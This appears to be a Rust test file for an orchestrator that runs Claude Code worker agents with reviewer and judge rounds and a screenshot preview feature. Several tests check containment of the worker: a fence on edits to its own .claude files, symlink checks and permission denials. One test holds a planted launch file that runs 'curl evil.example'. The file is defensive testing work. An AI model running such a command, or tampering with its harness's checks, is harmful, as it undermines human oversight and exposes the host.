use serde_json::{Value, json};

use crate::ports::{Checks, Finding, Role, Severity};
use crate::profile::INSTRUCTIONS;
use crate::runner::{Runner, StepReport, step};
use crate::shots::publish::MARKER;
use crate::test::{Rig, Scripted, ScriptedShots};

mod merge;

/// A playground-like project: a launch file on `main`, and the preview on
fn with_preview(project: &str) -> Rig {
    let rig = Rig::new(project);
    rig.land_launch_file();
    rig.edit_settings(|s| {
        format!(
            "{s}\n[app.dogs.kelpie.preview]\nenabled = true\nroutes = [\"/\", \"/events\"]\n\
             domains = [\"api.example.com\"]\n"
        )
    });
    rig
}

// Started, with issue 7 added and its pull request 71 waiting on the forge
fn started(rig: &Rig) -> std::sync::Mutex<Runner> {
    let runner = rig.open().unwrap();
    rig.ask(&runner, "start", None);
    rig.ask(&runner, "add", Some("7"));
    rig.forge.open_pull_request(71, "kelpie/7", &[7]);
    runner
}

fn read_json(path: &std::path::Path) -> Value {
    serde_json::from_str(&std::fs::read_to_string(path).unwrap()).unwrap()
}

fn shots_comments(rig: &Rig) -> Vec<String> {
    let comments = rig.forge.comments().into_iter();
    comments
        .filter(|(_, body)| body.starts_with(MARKER))
        .map(|(_, body)| body)
        .collect()
}

#[test]
fn a_project_without_a_launch_file_behaves_as_before() {
    let (rig, runner, _) = Rig::parked("shep");
    drop(runner);
    assert_eq!(rig.shots.jobs(), [], "no shots run");
    let [worker] = rig.claude.calls().try_into().unwrap();
    assert_eq!(worker.mcp_config, None);
    let instructions = std::fs::read_to_string(rig.paths().worker.join("instructions.md"));
    let instructions = instructions.unwrap();
    assert!(instructions.starts_with(INSTRUCTIONS), "{instructions}");
    assert!(!instructions.contains(crate::preview::WORKER_INSTRUCTIONS));
    assert_eq!(shots_comments(&rig), Vec::<String>::new());
    assert!(!rig.paths().worker.join("mcp.json").exists());
}

// shep carries a launch file for the maintainer's own Claude preview, not for kelpie.
#[test]
fn a_launch_file_on_main_without_the_setting_takes_no_shots() {
    let rig = Rig::new("shep");
    rig.land_launch_file();
    rig.edit_settings(|s| format!("{s}\n[app.dogs.kelpie.preview]\nroutes = [\"/\"]\n"));
    let runner = started(&rig);
    rig.claude.script([
        Scripted::Push("work.txt", "work\n"),
        Scripted::Text("CLEAN"),
    ]);
    for _ in 0..3 {
        step(&runner).unwrap(); // the turn, qwen, claude
    }
    let head = rig.forge.head_of("kelpie/7").unwrap();
    rig.forge.set_checks(&head, Checks::Passed);
    let ruling = rig.verdict(&runner);
    assert!(
        matches!(ruling, Some(StepReport::Ruling { id: 1, .. })),
        "{ruling:?}"
    );
    assert_eq!(rig.shots.jobs(), [], "no shots run");
    let [worker] = rig.claude.calls().try_into().unwrap();
    assert_eq!(worker.mcp_config, None);
    assert_eq!(shots_comments(&rig), Vec::<String>::new());
}

// shep's dev server lives in `web/`, so only a change there is worth shots.
fn with_web_preview(project: &str, change: &'static str) -> (Rig, std::sync::Mutex<Runner>) {
    let rig = Rig::new(project);
    let launch = r#"{"configurations": [{"name": "web", "runtimeExecutable": "npm", "runtimeArgs": ["run", "dev"], "port": 5173, "cwd": "web"}]}"#;
    rig.land(crate::preview::LAUNCH_FILE, launch);
    rig.edit_settings(|s| format!("{s}\n[app.dogs.kelpie.preview]\nenabled = true\n"));
    let runner = started(&rig);
    rig.claude
        .script([Scripted::Push(change, "change\n"), Scripted::Text("CLEAN")]);
    for _ in 0..3 {
        step(&runner).unwrap(); // the turn, qwen, then the shots or claude
    }
    (rig, runner)
}

#[test]
fn a_pull_request_that_changes_nothing_under_the_cwd_takes_no_shots() {
    let (rig, runner) = with_web_preview("shep", "src/lib.rs");
    let head = rig.forge.head_of("kelpie/7").unwrap();
    rig.forge.set_checks(&head, Checks::Passed);
    let ruling = rig.verdict(&runner);
    assert!(
        matches!(ruling, Some(StepReport::Ruling { id: 1, .. })),
        "{ruling:?}"
    );
    assert_eq!(rig.shots.jobs(), [], "no shots run");
    assert_eq!(shots_comments(&rig), Vec::<String>::new());
}

#[test]
fn a_pull_request_that_changes_the_cwd_takes_shots() {
    let (rig, _runner) = with_web_preview("shep", "web/app.tsx");
    let [job] = rig.shots.jobs().try_into().unwrap();
    let cwd = job.launch.unwrap().cwd;
    assert_eq!(cwd.as_deref(), Some("web"));
}

// Steps until the fence's ruling on a branch that changes `.claude`, and
// accepts it with a yes, as the maintainer would
fn accept_fenced_change(rig: &Rig, runner: &std::sync::Mutex<Runner>) {
    let ruling = (0..4).find_map(|_| match step(runner).unwrap() {
        Some(StepReport::Ruling { id, question, .. }) => Some((id, question)),
        _ => None,
    });
    let Some((id, question)) = ruling else {
        panic!("the fence let a change to .claude/launch.json through");
    };
    assert!(question.contains(".claude/launch.json"), "{question}");
    rig.ask(runner, "rule", Some(&format!("{id} yes")));
}

// The fence parks the change first; accepted, the preview still reads main.
#[test]
fn a_launch_file_the_worker_adds_on_its_branch_opens_nothing() {
    let rig = Rig::new("koji");
    let runner = started(&rig);
    rig.claude.script([Scripted::Push(
        ".claude/launch.json",
        r#"{"configurations": []}"#,
    )]);
    step(&runner).unwrap(); // the worker's turn adds the file
    accept_fenced_change(&rig, &runner);
    rig.claude.script([Scripted::Text("CLEAN")]);
    for _ in 0..4 {
        step(&runner).unwrap(); // the alert, qwen, then claude with no shots
    }
    assert_eq!(rig.shots.jobs(), []);
    let all = rig.claude.all_seen();
    let round = all.iter().find(|s| s.call.role == Role::Reviewer).unwrap();
    assert!(!round.call.prompt.contains("--- shots ---"));
}

// The per-turn check on Claude Code's own files passes with a launch file on
// main: the worker's second turn runs, as it does without a preview.
#[test]
fn the_fences_per_turn_check_passes_with_a_preview() {
    let rig = with_preview("lab");
    let runner = started(&rig);
    rig.claude.script([
        Scripted::Push("work.txt", "work\n"),
        Scripted::Say("HIGH|src/app.tsx:3|wrong colour|unreadable"),
        Scripted::Text(r#"{"holds": true, "severity": "high", "reason": "it is"}"#),
        Scripted::Push("fix.txt", "fixed\n"),
    ]);
    for _ in 0..10 {
        let report = step(&runner).unwrap();
        assert!(
            !matches!(
                report,
                Some(StepReport::Failed { .. } | StepReport::Ruling { .. })
            ),
            "{report:?}"
        );
        if rig.claude.calls().len() == 2 {
            break;
        }
    }
    let worker_turns = rig.claude.calls();
    assert_eq!(worker_turns.len(), 2, "the fix turn ran");
    assert!(worker_turns[1].mcp_config.is_some());
}

#[test]
fn a_dev_server_the_worker_left_is_stopped_when_its_turn_ends_and_on_restart() {
    let rig = with_preview("lab");
    let runner = started(&rig);
    rig.claude
        .script([Scripted::Fail(crate::ports::ClaudeError::TimedOut)]);
    step(&runner).unwrap(); // a turn killed at its ceiling
    // The one file kelpie records its server in, never a folder to list
    let recorded = rig.home.path().join("kelpie/shots/lab/7/dev-server.pid");
    assert_eq!(rig.shots.stopped(), std::slice::from_ref(&recorded));
    drop(runner);
    rig.open().unwrap();
    assert_eq!(rig.shots.stopped(), [recorded.clone(), recorded]);
}

#[test]
fn a_starting_runner_sweeps_its_own_worktrees_and_build_folders_for_orphaned_servers() {
    let rig = with_preview("lab");
    assert!(rig.shots.swept().is_empty());
    drop(started(&rig));
    let home = rig.home.path().join("kelpie");
    let own = [home.join("wt/lab"), home.join("targets/lab")];
    assert_eq!(rig.shots.swept(), [own.to_vec()]);
}

#[test]
fn a_worker_with_a_launch_file_gets_playwright_and_the_shots_tool() {
    let rig = with_preview("lab");
    let runner = started(&rig);
    rig.claude.script([Scripted::Push("work.txt", "work\n")]);
    step(&runner).unwrap();

    let [seen] = rig.claude.seen().try_into().unwrap();
    let worker = rig.paths().worker;
    assert_eq!(seen.call.mcp_config, Some(worker.join("mcp.json")));
    let mcp = read_json(&worker.join("mcp.json"));
    let tools = rig.home.path().join("kelpie/tools");
    assert_eq!(
        mcp["mcpServers"]["playwright"],
        json!({
            "command": "node",
            "args": [tools.join("node_modules/@playwright/mcp/cli.js"), "--config", worker.join("playwright.json")],
            "env": { "PLAYWRIGHT_BROWSERS_PATH": tools.join("browsers") },
        })
    );
    assert_eq!(
        mcp["mcpServers"]["kelpie"],
        json!({
            "command": Rig::KELPIE,
            "args": ["shots-mcp", tools, worker.join("shots-job.json")],
        })
    );
    let browser = read_json(&worker.join("playwright.json"));
    assert_eq!(
        browser["browser"]["launchOptions"]["args"],
        json!([
            "--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE localhost, EXCLUDE 127.0.0.1, EXCLUDE api.example.com"
        ])
    );
    let job = read_json(&worker.join("shots-job.json"));
    assert_eq!(job["routes"], json!(["/", "/events"]));
    assert_eq!(job["domains"], json!(["api.example.com"]));
    assert_eq!(
        job["out"],
        json!(rig.home.path().join("kelpie/shots/lab/7"))
    );

    let network = &seen.settings["sandbox"]["network"];
    assert_eq!(network["allowLocalBinding"], true);
    assert!(
        network["allowedDomains"]
            .as_array()
            .unwrap()
            .contains(&json!("api.example.com"))
    );
    // Nothing kelpie writes for the preview is in the worktree, so none of it
    // falls under the fence on Claude Code's own files there.
    let worktree = rig.worktree_7();
    for written in [
        worker.join("mcp.json"),
        worker.join("playwright.json"),
        worker.join("shots-job.json"),
        rig.home.path().join("kelpie/playwright/lab/7"),
    ] {
        assert!(written.exists(), "{written:?}");
        assert!(!written.starts_with(&worktree), "{written:?}");
    }
    let instructions = std::fs::read_to_string(worker.join("instructions.md")).unwrap();
    assert!(instructions.starts_with(INSTRUCTIONS));
    assert!(
        instructions.contains("# Seeing what you build"),
        "{instructions}"
    );
}

#[test]
fn playwrights_output_folder_is_kelpies_and_a_symlink_there_stops_the_turn() {
    let rig = with_preview("lab");
    let runner = started(&rig);
    let out = rig.home.path().join("kelpie/playwright/lab/7");
    std::fs::create_dir_all(out.parent().unwrap()).unwrap();
    std::os::unix::fs::symlink(rig.home.path(), &out).unwrap();
    let Some(StepReport::Failed { id, question, .. }) = step(&runner).unwrap() else {
        panic!("the turn ran with a symlinked output folder");
    };
    assert!(
        question.contains("is a symlink, not kelpie's own folder"),
        "{question}"
    );
    assert_eq!(rig.claude.calls(), [], "no worker started");

    std::fs::remove_file(&out).unwrap();
    rig.ask(&runner, "rule", Some(&format!("{id} yes")));
    rig.claude.script([Scripted::Push("work.txt", "work\n")]);
    let mut ran = false;
    for _ in 0..3 {
        step(&runner).unwrap(); // the ruling's alert, then the turn again
        ran |= !rig.claude.calls().is_empty();
    }
    assert!(ran, "the yes put the turn back");
    let browser = read_json(&rig.paths().worker.join("playwright.json"));
    assert_eq!(browser["outputDir"], json!(out));
    assert!(std::fs::symlink_metadata(&out).unwrap().is_dir());
    let seen = &rig.claude.seen()[0].settings;
    let allow = seen["sandbox"]["filesystem"]["allowWrite"].to_string();
    assert!(
        !allow.contains("kelpie/shots"),
        "the worker cannot write it: {allow}"
    );
}

#[test]
fn the_dev_server_command_comes_from_main_never_the_workers_branch() {
    let rig = with_preview("lab");
    let runner = started(&rig);
    let theirs = r#"{"configurations": [{"name": "dev", "runtimeExecutable": "sh", "runtimeArgs": ["-c", "curl evil.example"], "port": 9999}]}"#;
    rig.claude
        .script([Scripted::Push(".claude/launch.json", theirs)]);
    step(&runner).unwrap(); // the worker's turn changes the launch file
    accept_fenced_change(&rig, &runner);
    for _ in 0..4 {
        step(&runner).unwrap(); // the alert, qwen, then the shots
        if !rig.shots.jobs().is_empty() {
            break;
        }
    }
    let [job] = rig.shots.jobs().try_into().unwrap();
    assert_eq!(
        job.launch,
        Ok(crate::preview::Launch {
            name: "dev".into(),
            runtime_executable: "bun".into(),
            runtime_args: vec!["run".into(), "dev".into()],
            port: 3000,
            cwd: None,
        })
    );
}

#[test]
fn the_claude_round_gets_the_latest_shots_and_may_open_them() {
    let rig = with_preview("lab");
    let runner = started(&rig);
    rig.claude.script([
        Scripted::Push("work.txt", "work\n"),
        Scripted::Text("CLEAN"),
    ]);
    step(&runner).unwrap(); // the worker's turn
    step(&runner).unwrap(); // round 1, qwen: clean
    let head = rig.forge.head_of("kelpie/7").unwrap();

    let Some(StepReport::Shots {
        head: of,
        shots,
        problems,
        ..
    }) = step(&runner).unwrap()
    else {
        panic!("round 2 took no shots first");
    };
    assert_eq!((of.as_str(), shots, problems), (head.as_str(), 8, vec![]));
    let [job] = rig.shots.jobs().try_into().unwrap();
    let dir = rig.home.path().join("kelpie/shots/lab/7");
    assert_eq!(job.out, dir.join(&head[..7]));
    assert_eq!(job.worktree, rig.worktree_7());

    step(&runner).unwrap(); // round 2, claude
    let all = rig.claude.all_seen();
    let round = all.iter().find(|s| s.call.role == Role::Reviewer).unwrap();
    let shot = dir.join(&head[..7]).join("events-mobile-dark.png");
    assert!(
        round
            .call
            .prompt
            .contains(&format!("/events at mobile, dark: {}", shot.display()))
    );
    assert!(
        round
            .call
            .prompt
            .contains("gives its location as the PNG's full path and `:0`")
    );
    assert_eq!(
        round.settings,
        json!({ "permissions": {
            "deny": ["Agent", "Task", "Bash"],
            "additionalDirectories": [dir],
        } })
    );
    assert_eq!(rig.shots.jobs().len(), 1, "one run of one head");
}

#[test]
fn a_finding_that_cites_a_screenshot_is_judged_with_it_open() {
    let rig = with_preview("lab");
    let runner = started(&rig);
    rig.claude.script([Scripted::Push("work.txt", "work\n")]);
    step(&runner).unwrap(); // the worker's turn
    step(&runner).unwrap(); // round 1, qwen: clean
    step(&runner).unwrap(); // the shots
    let head = rig.forge.head_of("kelpie/7").unwrap();
    let dir = rig.home.path().join("kelpie/shots/lab/7");
    let shot = dir.join(&head[..7]).join("events-mobile-dark.png");
    let finding = format!(
        "HIGH|{}:0|white text on white in dark mode|unreadable",
        shot.display()
    );
    rig.claude.script([
        Scripted::Say(Box::leak(finding.into_boxed_str())),
        Scripted::Text(r#"{"holds": true, "severity": "high", "reason": "it is unreadable"}"#),
    ]);
    step(&runner).unwrap(); // round 2, claude: one finding
    step(&runner).unwrap(); // the judge

    let all = rig.claude.all_seen();
    let judge = all.iter().find(|s| s.call.role == Role::Judge).unwrap();
    assert!(
        judge
            .call
            .prompt
            .contains(&format!("the screenshot {}", shot.display()))
    );
    let deny = judge.settings["permissions"]["deny"].as_array().unwrap();
    assert!(!deny.contains(&json!("Read")), "{deny:?}");
    assert!(deny.contains(&json!("Bash")));
    assert_eq!(
        judge.settings["permissions"]["additionalDirectories"],
        json!([dir])
    );

    let Some(StepReport::ReviewFindingsSent { held: 1, .. }) = step(&runner).unwrap() else {
        panic!("the held screenshot finding did not reach the worker");
    };
    let findings = std::fs::read_to_string(rig.build_7().join("review-findings.md"));
    assert!(findings.unwrap().contains(&shot.display().to_string()));
}

#[test]
fn a_finding_on_a_file_is_judged_with_every_tool_denied_as_before() {
    let rig = with_preview("lab");
    let runner = started(&rig);
    rig.claude.script([Scripted::Push("work.txt", "work\n")]);
    step(&runner).unwrap();
    rig.reviewer
        .script([crate::test::ScriptedRound::Findings(vec![Finding {
            severity: Severity::Low,
            file: "src/app.tsx".into(),
            line: 4,
            what: "unused import".into(),
            why: "dead code".into(),
        }])]);
    step(&runner).unwrap(); // round 1, qwen: one finding
    rig.claude.script([Scripted::Text(
        r#"{"holds": false, "severity": "low", "reason": "no"}"#,
    )]);
    step(&runner).unwrap(); // the judge
    let all = rig.claude.all_seen();
    let judge = all.iter().find(|s| s.call.role == Role::Judge).unwrap();
    assert_eq!(
        judge.settings["permissions"]["additionalDirectories"],
        Value::Null
    );
    assert!(
        judge.settings["permissions"]["deny"]
            .as_array()
            .unwrap()
            .contains(&json!("Read"))
    );
}

#[test]
fn a_head_that_cannot_be_fetched_leaves_the_round_a_note_not_a_failure() {
    let rig = with_preview("lab");
    let runner = started(&rig);
    rig.claude.script([
        Scripted::Push("work.txt", "work\n"),
        Scripted::Text("CLEAN"),
    ]);
    step(&runner).unwrap(); // the worker's turn
    step(&runner).unwrap(); // round 1, qwen: clean
    let origin = rig.home.path().join("origin.git");
    let moved = rig.home.path().join("origin-away.git");
    std::fs::rename(&origin, &moved).unwrap();
    let report = step(&runner).unwrap(); // round 2, claude, with no fetch possible
    std::fs::rename(&moved, &origin).unwrap();

    assert!(
        matches!(
            report,
            Some(StepReport::ReviewFindingsSent {
                round: 2,
                clean: true,
                ..
            })
        ),
        "{report:?}"
    );
    assert_eq!(
        rig.shots.jobs(),
        [],
        "no run of a head kelpie could not read"
    );
    let all = rig.claude.all_seen();
    let round = all.iter().find(|s| s.call.role == Role::Reviewer).unwrap();
    assert!(
        round
            .call
            .prompt
            .contains("The shots run failed: kelpie could not read the head to take shots of: ")
    );
}

#[test]
fn a_failed_shots_run_is_reported_and_the_round_goes_on() {
    let rig = with_preview("lab");
    let runner = started(&rig);
    rig.claude.script([
        Scripted::Push("work.txt", "work\n"),
        Scripted::Text("CLEAN"),
    ]);
    step(&runner).unwrap(); // the worker's turn
    step(&runner).unwrap(); // round 1, qwen: clean
    rig.shots
        .script([ScriptedShots::Fail("port 3000 is already in use")]);
    let report = step(&runner).unwrap().unwrap();
    assert!(!report.waits(), "a failed run holds nothing up");
    let StepReport::Shots {
        shots: 0, problems, ..
    } = report
    else {
        panic!("{report:?}");
    };
    assert_eq!(problems, ["port 3000 is already in use"]);

    step(&runner).unwrap(); // round 2, claude, all the same
    let all = rig.claude.all_seen();
    let round = all.iter().find(|s| s.call.role == Role::Reviewer).unwrap();
    assert!(
        round
            .call
            .prompt
            .contains("The shots run failed: port 3000 is already in use")
    );
    assert_eq!(
        rig.ask(&runner, "status", None)["work_item"]["phase"]["state"],
        "ci",
        "two clean rounds end the loop, shots or none"
    );
}

#[test]
fn routes_the_worker_names_join_kelpies_next_run() {
    let rig = with_preview("lab");
    let runner = started(&rig);
    rig.claude.script([Scripted::Push("work.txt", "work\n")]);
    step(&runner).unwrap(); // the worker's turn
    let shots = rig.home.path().join("kelpie/shots/lab/7");
    let raids = crate::preview::Route::try_from("/raids".to_owned()).unwrap();
    crate::shots::name_routes(&shots, &[raids]).unwrap();
    step(&runner).unwrap(); // round 1, qwen
    step(&runner).unwrap(); // the shots
    let [job] = rig.shots.jobs().try_into().unwrap();
    let routes: Vec<&str> = job.routes.iter().map(|r| r.as_str()).collect();
    assert_eq!(routes, ["/", "/events", "/raids"]);
}
